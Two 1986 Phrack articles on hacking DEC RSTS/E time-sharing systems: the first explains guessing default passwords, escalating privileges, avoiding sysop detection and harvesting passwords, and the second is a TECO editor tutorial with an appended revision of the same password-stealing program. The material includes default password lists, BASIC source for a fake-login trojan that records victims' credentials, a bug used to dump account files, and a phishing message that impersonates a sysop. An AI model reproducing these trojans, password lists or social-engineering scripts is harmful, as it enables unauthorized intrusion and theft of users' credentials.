                               ==Phrack Inc.==

                    Volume One, Issue 7, Phile 5 of 10

                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                    $                                    $
                    $         PROGRAMMING RSTS/E         $
                    $          File1: Passwords          $
                    $                                    $
                    $           by:  The Seker           $
                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
                    $     Written  (c)  May 22, 1986     $
                    $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

PREFACE:
--------

     This document is first in a series of ongoing files about using the
RSTS/E operating system.  All the files are based on version 8.0 as it is
almost fully compatible with the previous releases.  If the need arises I have
made sure to note differences between V8.x and V9.x.
   Credit goes to High Evolutionary for urging me to write these files; to
Night Stalker for sharing info; and to all other RSTS hackers that have
contributed in some way or another.

HISTORY:
--------
     The RSTS/E (Resource System Time Sharing /Environment) operating system
was developed for the PDP/11 series of minicomputers created by DEC. (Digital
Equipment Corporation)  It was developed with ease of use for the user (and
hacker) in mind.  Because of this, there have been a lot of overlooked errors
leaving the system with quite weak security.  In later versions, especially
the 9.x series password security has been greatly improved and is more secure,
but still has plenty of bugs for us to breach.

LOGGING ON:
-----------
     Briefly.. locate a valid number and connect.  Hit c/r (carriage return) a
few times or type:
 HELLO
The system should identify itself displaying to you who owns it, what version
they're running under, the date, and the time.  Then it will prompt for an
account number and a password.
     Accounts are in a PPN (Project Program Number) format.  This is actually
two numbers each between 0 and 254 separated by a comma or a slash.  (eg. 3,45
or 27/248)  Privileged accounts which you should hopefully be striving for all
start with a 1.  So start hacking 1,x accounts.
     Passwords are 1-6 characters long.  They are only alphanumeric so you
don't have to worry about all that other shit being included.  On V9.x systems
passwords may be up to 8 characters if the operator has changed the default
length.  But this rarely ever happens as most ops are too lazy.
     Common passwords are:
 SYSLIB
 SYSGEN
 SYSCON
 SYSMGR
 SYSOPR
 SYSTEM
 OPRATR
 RSTS
 DECNET
 GAMES
 YYYYYY
 XXXXXX
 XYXYXY
 DATA
 RICH
 XXX
 AAA
     Many of those have been rumored to be defaults.  But actually I think the
true default (if there is one!) password is:
 RSTSE
     Also, accounts that have a password of:
 ??????
are only accessible by operators.
     Remember to try names, cars, objects, the name of the company (in
different variations), etc.  Cause most people generally pick passwords that
have some relation to their private life.. Take a little time and guess...

YOUR IN!
--------
     Once you have succeeded in hacking out a valid password, whether it be
privileged or not, I suggest you find out who is logged onto the system.  You
can do this simply by typing:
 SY
     This will tell you everyone logged on, what they are doing at the moment,
their job number, whether they are attached or detached, and a hell of a lot of
other crap.  What you are looking for is someone else logged in under the same
account you are.  If you find another user in the same account you hacked, log
off and call back later.  This will prolong the life of your account and
prevent a rise in suspicion by the sysops.  Remember, every system keeps a log
of what you do, and if two people are logged in under the same account many
times the sysops will delete or change the password to that account.
     If everything checks out okay, you're free to do as you please.  To list
the files in your allotted space type:
 DIR
or to see all the files on the system type:
 DIR (*,*)
    NOTE: [ ] may be used in place of ( ) when dealing with files.
     * acts as a wildcard on the RSTS system and can be used in place of
account numbers when searching for specific files.  Speaking of searching for
files; to run a file type:
 RUN filename.filetype
where filename = the file you wish to run, and filetype = the extension.
     Experiment!  Try what you will.  If you ever need help just type:
 HELP
     Read the files contained within help.  They are very detailed and I
guarantee can help you with what ever it is you need done.
     One other thing, a few useful control characters are:
 ^C   Breaks out of whatever your doing
 ^R   Repeats last line typed
 ^X   If ^C doesn't work, this may
 ^O   Use to stop the flow of text without aborting the function in process
 ^T   Tells status and runtime of terminal
 ^U   Deletes line presently being typed in
 ^H   Deletes characters
 ^S   Transmission off
 ^Q   Transmission on

GAINING PRIVILEGES:
-------------------
     If you weren't able to hack out a privileged account don't panic.  There
are still a few other ways for you to attain sysop status.  These methods may
not always work, but they are worth a try.
   ]SYSTEM LOG[
     On many RSTS/E systems before V9.0 there is one account dedicated to
keeping the system log; everything you and everyone else does.  I have found
this account many times to be 1,101, 1,2, or 0,1 but you may want to do a
directory find to make sure.  Type:
 DIR (*,*)OPSER.LOG
or if nothing appears from that type:
 DIR (*,*)SYSLOG.*
or
 DIR (*,*)
     Look for a file similar in name to that and mark down the account it
appears in.  Now that you know which account the system log resides in logoff.
 BYE
     Then sign back on using the account in which the file was in.  For
password try one of the following:
 OPSER
 OPSLOG
 LOG
 OPS
 OOPS
 OPRATR
 SYSLOG
 SYSTEM
     These are common passwords to that account.  If none of these work your
out of luck unless you can think of some other password that may be valid.
   ]SYSTEM BUGS[
     When operating systems as complex as RSTS/E are created there will
undoubtedly be a few bugs in the operation or security.  (Sometimes I am not
sure if these are intentional or not.)  These can often be taken advantage of.
One that I know of is RPGDMP.TSK.  To use this type:
 RUN (1,2)RPGDMP
     It will ask for a filename, and an output device.  Give it any filename on
the system (I suggest $MONEY, $REACT, or $ACCT.SYS) and it will be dumped to
the specified device. (db1:, screen, etc).
     Credit for this goes to The Marauder of LOD for finding, exposing and
sharing this bug with all.
     If you find any other bugs similar to this, I would appreciate your
getting in touch with and letting me know.

GETTING PASSWORDS:
------------------
     Now that you've hopefully gotten yourself priv's we can get on with these
files.  Getting many passwords is a safety procedure, kind of like making a
backup copy of a program.  There are a number of ways to get yourself
passwords, the easiest is by using privileges, but we will discuss that in a
later file.  The methods I am going to explain are the decoy and a trick I like
to use, which I call the mail method.
   ]DECOY[
     The decoy, commonly called a Trojan Horse, (which is something completely
different) is a program which emulates login.bac.  When the unsuspecting user
enters his account and password you have your program store it into a file that
you can retrieve later.  Here is a short program I've written that will preform
this task:

type NEW and it will prompt for a filename.  Enter something not to obvious.

   1 ! RSTSE Decoy
   2 ! Written by The Seker (c) 1986 TOK!
   5 extend
  10 print:print
  20 &"RSTS V8.0-07 TOK Communications Ltd.  Job 7  <Dial-up> KB41
 ";date$(0);"  ";time$(0)
  30 print
  40 &"User: ";
  50 open "KB:" for input as file 1
  60 on error goto 300
  70 input 1,proj%,prog%
  80 z$=sys(chr$(3%))
  90 &"Password: ";
 100 on error goto 300
 110 input 1,pass$
 120 print:z$=sys(chr$(2%))
 130 close 1
 140 open "SYSLIB.BAC" for output as file 2
 150 print 2,proj%
 160 print
2,prog%
 170 print 2,pass$
 180 close 2
 200 print:print
 210 off$=sys(chr$(14%)+"bye/f"+chr$(13))
 300 if erl=70 then goto 350
 310 if erl=110 then goto 360
 350 &"Invalid entry - try again":z$=sys(chr$(2%)):try=try+1:if try=5 then goto
200 else resume 30
 360 &"Invalid entry - try again":try=try+1:if try=5 then goto 200 else resume
90
 999 end

     The program as I said emulates login.bac, then logs the person off after a
few tries.  Save this program.  Then run it.  When it starts, just drop the
carrier.  The next person to call within 15 minutes will get your imitation
login.
     If you are working on an older system like V7.0 change line 40 to read:
 40 &" ";
   NOTE: This will not work without modifications on releases after V8.7.  An
improved and updated version of this program will be released as a small file
at a later date.
     Next time you login and you want to recover the file type:
 TYPE SYSLIB.BAC
     It should print out the account and password.  If you set this running
each time you plan on hanging up within a few days you'll have yourself a
handful of valid accounts.
   ]MAIL[
     To run mail type:
 RUN $MAIL
     The mail method is probably used by many hackers and since I like to use
it, I thought I'd tell you what it was.
     When you run the program the utility will tell you exactly how to use
itself.  Assuming you know a little about it anyway we will get on with the
file.  The object is to send mail to another user and try and convince him/her
you are the sysop and are writing him/her to validate their password.  Don't
try this with a priv'd user!  It would result in instant deletion.
     Here's basically what you'd type:

   Hello.  We are contacting each of the users and validating their records to
keep our files up to date. If you would cooperate and leave me a response which
includes your full name, account number, and password we would appreciate your
help.

                                           John Doe
                                       System's Operator
                                             4,11

     As you can see the idea is to con a user into believing you are one of the
system ops.  I would say this method works approximately 70% of the time on
most systems since users often times don't associate with sysops.  Use a
different name if you try this though, as John Doe wouldn't fool anyone.  (Be
creative)  Also the 4,11 is the account you'd like them to leave the response
too.
     You can try a few variations of this if you like.  For example, if the
system you're hacking has a chat program:

 RUN $TALK

You can just talk live time to them.  Or if you somehow (like trashing) manage
to get a list of all the users and their phone numbers, you can call them up
and bullshit them.

   NOTE: This document is intended for informational purposes only.  The author
         is in no way responsible for how it is used.  Sysops are free to
         display this at their will as long as no information within is altered
         and all acknowledgements go to The Seker.

                            ==Phrack Inc.==

                    Volume One, Issue Nine, Phile #4 of 10

  $$$$$$$$$$$$$$$$$$$$$$$$
  $  PROGRAMMING RSTS/E  $
  $    File2: Editors    $
  $ by:                  $
  $      Solid State     $
  $$$$$$$$$$$$$$$$$$$$$$$$

  Written (c) Oct 11, 1986
  ------------------------

   Within this article I will be focusing on the TECO text editor found on
almost every installation of RSTS that you will pass by today. I feel it is
unneeded to do a write up on the other editors such as EDT, a screen editor
for VT100 and VT52 terminals, and EDFOR, a FORTRAN text editor, as most
hackers will not have the proper hardware/software at their disposal.
   This file does not contain many tricks, but has straightforward information
that most assuredly can be found in the user manual. Since not everyone has
access to help documents though, this file will provide a base for the first
time editor user and hopefully a reference for the experienced. If you feel
otherwise.. don't waste your time reading it.
   Following the main portion of the file is an updated copy of the decoy
trick I promised to revise that was featured in my first file. Hopefully, (I
am not promising though), I have succeeded in removing all the bugs this time.

USES
====

   A text editor, for those of you that happen to be brain dead, is a utility
similar to the word processor you use everyday on your micro: it allows a
person to create, modify, and compile text files. But, also can edit, and if
need be, create program files. For these reasons and many others, knowing how
to use an editor thoroughly can be a major advantage to the hacker on future
explorations.

EXECUTING
=========

   Typing TECO invokes the TECO text editor. If TECO is just typed without any
modifiers, then the file edited last will be placed in the editing buffer.
(More on this subject can be found below under MEMORY.) To edit a different
file, or create a new file, the following forms are used:

TECO filename.ext                  To edit an existing file.
TECO outfile.ext=infile.ext        To edit from one file to another.
MAKE filename.ext                  To create a new file.

   Other ways to execute TECO involve VT terminals, but we are not going into
that much detail within this text.

INITIALIZATION
==============

   If there is a file named TECO.INI in your directory when TECO is invoked,
it is assumed to be the macro settings for a VT terminal. We don't need to
bother with those, so make sure to disable the search by appending the switch
/NOINI on execution.

MEMORY
======

   Each time TECO is executed, the name of the file being edited is placed
into another file titled TECFnn.TMP where nn is your job number. If you invoke
TECO and wish to edit a file different than the one currently in the memory
file, select the switch /NOMEMORY.

MODIFIERS
=========

   There are a number of options, called switches, which modify the execution
of the TECO utility. Some like /NOINI and /NOMEMORY I have previously
mentioned. Other important switches follow along with a short description of
each. To select one of these options, append it to the call string when you
invoke TECO:

TECO filename.ext /[option1] /[option2] ...

/FIND                              This places the pointer at
                                    the last marked position
                                    within the input file.
/INSPECT                           If selected, you can only
                                    read the file, not edit.

   There are a few more that deal with the VT terminals, but as I've said
already, there is really no need to list them.

INTERRUPT
=========

   The control character 'C' (CTRL/C or ^C -which it shall from now on be
referred to as.) is used to halt the execution of the current TECO command,
the same as it does in the BASIC monitor. If ^C is typed twice without a TECO
command in between, the utility is aborted. (You are returned to the keyboard
monitor whichever it was.. eg. BASIC, BASIC+2, RSX..)

COMMAND EXECUTION
=================

   When TECO is called, you will receive the  *  prompt. This is the command
prompt. Almost all commands used by the editor are one or two characters in
length and are typed in using a normal ASCII keyboard. To terminate a TECO
command the <ESCAPE> sequence is used. When typed, it will echo back as a  $
character. Two consecutive <ESCAPE>s must be entered before a command will be
carried out. This allows you to string together a line of commands like:

* [command1]$[command2]$[command3]$ ... $$

COMMANDS
========

 ]Moving the Pointer[

   The text pointer is used to represent where you are working, ie. if you
were to enter a command, what part of the text it would affect. It's similar
to the job your cursor does when writing a program on your micro.

'J'

   The "J" command is used to move the text pointer to the beginning or end of
the editing buffer.

   BJ     Move to the beginning of the buffer.
   ZJ     Move to end of the editing buffer.

'L'

   The "L" command moves the text pointer from one line to another. Common
forms of the command are:

   L      Move to beginning of the next line.
   0L     Move to front of current line.
   3L     Move to the third line down from the current line.
  -1L     Move back to previous line. (One above current.)
...

'C'

   The "C" command is used to move the text pointer past a specified number of
characters, forward or backwards, on the current line. Common forms include:

   C      Advance the pointer to the next character.
   5C     Move the pointer forward five characters.
  -5C     Move back five characters.
...

 ]Listing Text[

   There is one command with a couple various forms to list the text within
the editor; they follow.

'T'

   The "T" is used to list text from the editing buffer. Commonly found forms
are:

   HT     Print the entire contents of the editing buffer.
   T      Type text from the pointer to the end of the current line.
   0T     Type text from the beginning of the line to the text pointer.
   5T     Print the next five lines of text from the buffer, starting where
           the pointer is located.
...

 ]Entering Text[

   What use is an editor if you can't add to the text? There is one command,
insert, which allows you to write. If you are creating a file from scratch,
you would enter the insert command each time you wanted to add a new line to
your document.

'I'

   The "I" command is used to insert text into the buffer. After issued, the
text entered will be placed where the text pointer is located. The command is
of the form:

   I <text> <ESCAPE>

For example, to insert the sentence, "This is an example.", type:

   IThis is an example$

(Note: Remember that <ESCAPE> echoes back to your screen as $)

 ]Deleting Text[

   The TECO text editor makes it easy to delete words, sentences, etc. from
the buffer. There are two different commands used, line delete, and letter
delete.

'K'

   The "K" issued when you choose to delete lines of text from the editing
buffer. Common forms are as follows:

   K      Delete the text from the pointer through the end of the current
           line.
   0K     Delete the text from the beginning of the line to through the
           pointer.
   5K     Omit the following five lines from the buffer.
   HK     Kill the entire contents of the buffer.
...

'D'

   The "D" appropriately is used to delete individual characters. A few of the
forms found are:

   D      Delete the character which follows directly after the text pointer.
   5D     Delete the following five characters from the text, starting from
           the pointer.
  -1D     Delete the character directly behind the pointer.
...

 ]Searching[

   All good word processors include a routine to search and replace a string
of text. So does the TECO text editor. Two forms are used, the locate text,
and the search and replace text commands.

'S'

   The "S" is used to locate a specified string of text currently in the
editing buffer. If the text is found, the pointer is positioned directly after
the specified text. If the string is not found, an error message results and
the text pointer is placed at the beginning of the buffer.

   S <text> <ESCAPE>

For example, to locate "This is an example.", enter:

   SThis is an example.$

'FS'

   "FS" for find and replace does exactly that. It searches for a specified
string of text, and if found replaces it with another sting of text. If the
specified text is not found though, the pointer is positioned at the beginning
of the buffer just like the "S" command. The "FS" command is of the form:

   FS <old text> <ESCAPE> <new text> <ESCAPE>

For an example, to replace "hullo" with "hello!", use the command:

   FShullo$hello!$

 ]Saving[

   To save the new version of the file which you have been editing, you enter
the exit command and it shall be saved in your directory. Remember though, if
you wish to quit but not replace a file with your edited version, just type ^C
twice.

'EX'

   The "EX" command is used to write the current buffer to the output file,
then exit from TECO. For example:

   EX$$

(Note: Remember that <ESCAPE> is echoed as $, and typing <ESCAPE> twice causes
a command to be executed.)

FLAGS
=====

   The TECO text editor is not limited to the commands already shown. The
editor has a few flags which can be entered at the  *  prompt that will modify
the TECO environment.
   To examine the value of a flag type:

   [flag]x

Where [flag] is the specified flag and x is a numeric argument which returns
text. To set the value of a flag enter:

   x[flag]

Where x is the number or command being specified for the flag [flag].

'EH'

   EH is the error handling flag. Here's the table of arguments and their
meanings:

Value     Meaning

    1     If an error is encountered within the operation of TECO, only the
           3-character error code is printed.
    2     If an error is encountered during operation, a short message
           explaining the error is printed. (default setting)
    3     If an error is encountered, the command(s) which led to the error
           are printed.

'ET'

   ET, or Edit Terminal, is the command for modifying terminal output. Table
of arguments follows:

Value     Meaning

    1     Output is in image mode.
    2     Terminal in use is a scope.
    4     Terminal in use has lowercase available.
    8     ^T is read without echo.
   16     Cancels ^O during output.
  128     TECO aborts if an error is encountered.
  256     Output to screen is truncated to the terminal's width.
  512     VT terminal support available.
 1024     (same as above)
32768     Traps ^C

'^X'

   ^X, the last flag I'll mention, deals with searches. (Look above for the
command to search.)

Value     Meaning

    0     Either case matches during searches.
    1     An exact case match is required to complete a search.


CONCLUSION
==========

   That just about wraps up the TECO text editor.. boring eh? But as I've said
time and again, editors are important to hackers.

 Till next time...

   Solid State
>>>PhoneLine Phantoms!

_______________________________________________________________
File1- Addendum:

   Here's the updated version of the decoy program (yeah, the one that had an
error!) that was featured in File1. The concept of this revision is slightly
different, but it 'should' work more efficiently and easily than the first.
   To execute the program, first do a SYstat and record the KB numbers of
potential targets. Run the program, and enter the number of the KB only..
(Don't hang up!) ..then just wait till the program has ended and then check
the output file.

Note: This listing will not without modification work on all systems or under
      all conditions.


1 ! R S T S decoy
10 EXTEND
100 ON ERROR GOTO 1000
120 PRINT CHR$(140):PRINT:PRINT
130 INPUT "To which keyboard (KB)";K$
140 K$=CVT$$(K$,4%)
200 OPEN "KB:"+K$ AS FILE #1%
220 INPUT LINE #1%,A$
230 IF CVT$$(A$,4%)="" THEN 220
240 PRINT #1%
240 PRINT #1%,"RSTS"
250 PRINT #1%
260 PRINT #1%,"User: ";
270 INPUT LINE #1%,U$:U$=CVT$$(U$,4%)
280 T$=SYS(CHR$(3%))
290 PRINT #1%,"Password: ";
300 INPUT LINE #1%,P$:P$=CVT$$(P$,4%)
310 Z$=SYS(CHR$(2%))
320 PRINT #1%
330 PRINT #1%,"Invalid entry - try again":PRINT #1%
340 CLOSE #1%
400 OPEN "DATA.TXT" FOR OUTPUT AS FILE #2%
410 PRINT #2%,U$;";";P$
420 CLOSE #2%
999 END
1000 PRINT "?ERROR line #";ERL:STOP
